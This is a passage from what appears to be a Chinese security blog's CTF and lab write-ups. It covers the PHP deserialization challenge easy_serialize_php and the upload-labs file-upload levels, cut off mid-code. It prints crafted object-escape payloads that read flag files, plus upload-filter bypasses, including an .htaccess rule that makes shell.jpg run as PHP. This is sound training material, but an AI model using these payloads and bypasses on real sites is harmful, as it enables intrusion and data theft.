class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>序列化之后并不是最终的payload，这里反序列的时候先调用_wakeup()函数，会把username初始化为guest，所以需要绕过它。</p><p>而绕过_wakeup()函数只需要让对象的属性数比它实际的大就行</p><h4 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h4><p>根据代码提示，在phpinfo里面找到一个这个</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208201837952.png" alt="image-20210208201837952"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//它的主要作用是将数组展开，键名作为变量名，元素值为变量值</span><span class="token comment">//int extract ( array $var_array [, int $extract_type [, string $prefix ]] )</span><span class="token comment">//本函数用来将变量从数组中导入到当前的符号表中。接受结合数组 var_array 作为参数并将键名当作变量名，值作为变量的值。对每个键值对都会在当前的符号表中建立变量，并受到 extract_type 和 prefix 参数的影响。</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到第一个函数，会过滤掉一些关键词，很显然这是一种对象逃逸的题</p><p>过滤函数一般分为两种情况：<br><strong>第一种为关键词数增加</strong></p><p>例如： where-&gt;hahaha，这样词数由五个增加到6个</p><p><strong>第二种为关键词数减少</strong></p><p>比如会直接过滤掉一些关键词，这道题一样</p><p>过滤函数filter()对serialize($_SESSION)进行过滤，滤掉一些关键字<br>那么我们有两种方法：<br><strong>键逃逸和值逃逸</strong></p><p>值逃逸：<br>需要两个连续的键值对，由第一个的值覆盖第二个的键，这样第二个值就逃逸出去，单独作为一个键值对</p><pre class="line-numbers language-none"><code class="language-none">_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&amp;function&#x3D;show_image<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>var_dump的结果为：</p><pre class="line-numbers language-none"><code class="language-none">&quot;a:3&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;&quot;;&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>键逃逸：</p><p>只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对</p><pre class="line-numbers language-none"><code class="language-none">_SESSION[flagphp]&#x3D;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>var_dump的结果为：</p><pre class="line-numbers language-none"><code class="language-none">&quot;a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc&#x3D;&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;&quot;;&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意到这里的s:7:””之所以为空，是因为构造的键flagphp都是会被过滤的，所以显示为空，这样就能吃掉一部分值了，然后将剩下得值充当另一个对象逃逸出去~~</p><p>然后看这题</p><p>如果<code>f=show_image</code>，会执行反序列化</p><pre class="line-numbers language-none"><code class="language-none">$userinfo &#x3D; unserialize($serialize_info);echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们可以利用反序列化执行<code>d0g3_f1ag.php</code>，先对<code>d0g3_f1ag.php</code>base64加密，得到<code>ZDBnM19mMWFnLnBocA==</code></p><p>构造payload，因为会过滤<code>php</code>，<code>flag</code>，<code>php5</code>，<code>php4</code>，<code>fl1g</code></p><pre class="line-numbers language-none"><code class="language-none">$filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对</p><pre class="line-numbers language-none"><code class="language-none">_SESSION[flagflag]&#x3D;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以这样子构造</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208201854946.png" alt="image-20210208201854946"></p><p>提交之后发现一片空白，查看源码发现有个提示</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208201905995.png" alt="image-20210208201905995"></p><p>flag就在这里面了</p><p>还是同样的方法，对<code>/d0g3_fllllllag</code>base64加密，得<code>L2QwZzNfZmxsbGxsbGFn</code>，只需要把原来的base64换成这个就行了</p><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208203425686.png" alt="image-20210208203425686"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs</title>
      <link href="2020/ba-chang/upload-labs/"/>
      <url>2020/ba-chang/upload-labs/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210306203055304.png" alt="思维导图"></p><h2 id="pass-01-js-audit"><a href="#pass-01-js-audit" class="headerlink" title="pass-01 js audit"></a>pass-01 js audit</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token operator">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword type-declaration">null</span> <span class="token operator">||</span> <span class="token class-name">file</span> <span class="token operator">==</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"请选择要上传的文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//定义允许上传的文件类型</span>    <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string double-quoted-string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>    <span class="token comment">//提取上传文件的类型</span>    <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token operator">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token operator">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//判断上传文件类型是否允许上传</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token operator">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token string double-quoted-string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string double-quoted-string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string double-quoted-string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接在js上添加php或者禁用js或者burp改包就好了</p><h2 id="Pass-02-只验证Content-type"><a href="#Pass-02-只验证Content-type" class="headerlink" title="Pass-02 只验证Content-type"></a>Pass-02 只验证Content-type</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'文件类型不正确，请重新上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>抓包改Content-Type即可。</p><h2 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03 黑名单绕过"></a>Pass-03 黑名单绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.asp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.aspx'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//收尾去空</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里不允许上传 .asp, .aspx, .php, .jsp后缀文件，但可以上传其他的后缀,如</p><pre class="line-numbers language-none"><code class="language-none">.phtml .phps .php5 .pht<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>前提是 apache 的 httpd.conf 中有如下配置代码</p><pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .php .phtml .phps .php5 .pht<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者上传 .htaccess 文件</p><pre class="line-numbers language-none"><code class="language-none">&lt;FilesMatch &quot;shell.jpg&gt;  SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是需要mod_rewrite 开启；且AllowOverride All</p><p>此时上传的 shell.jpg 会被解析成 php</p><p>一般黑名单都可以利用apache解析漏洞绕过</p><h2 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04 .htaccess绕过"></a>Pass-04 .htaccess绕过</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"php1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pHp1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token 